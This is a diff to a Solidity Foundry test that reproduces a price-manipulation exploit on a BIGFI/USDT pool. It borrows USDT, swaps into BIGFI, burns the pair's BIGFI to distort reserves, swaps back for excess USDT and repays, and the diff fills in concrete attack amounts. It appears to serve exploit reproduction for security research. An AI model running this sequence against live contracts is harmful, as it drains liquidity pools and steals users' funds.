@@ -210,21 +210,18 @@ contract BIGFITest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt_owner(0x1bc16d674ec80000);
+        borrow_usdt_owner(200000e18);
         printBalance("After step0 ");
-        swap_pair_attacker_usdt_bigfi(
-            0xde0b6b3a7640000,
-            0x132d7ecdfd1af70
-        );
+        swap_pair_attacker_usdt_bigfi(200000e18, 6049.946035638727192292e18);
         printBalance("After step1 ");
-        burn_bigfi_pair(0x1f8b0dee6cfaf200000);
+        burn_bigfi_pair(3260e18);
         printBalance("After step2 ");
         swap_pair_attacker_bigfi_usdt(
-            0xde0b6b3a764000,
-            uint256(6304596058458841677824) * 99 / 100
+            6049.946035638727192292e18,
+            307427.442385714227894965e18
         );
         printBalance("After step3 ");
-        payback_usdt_owner(0x29a2241af62c0000);
+        payback_usdt_owner(200600e18);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
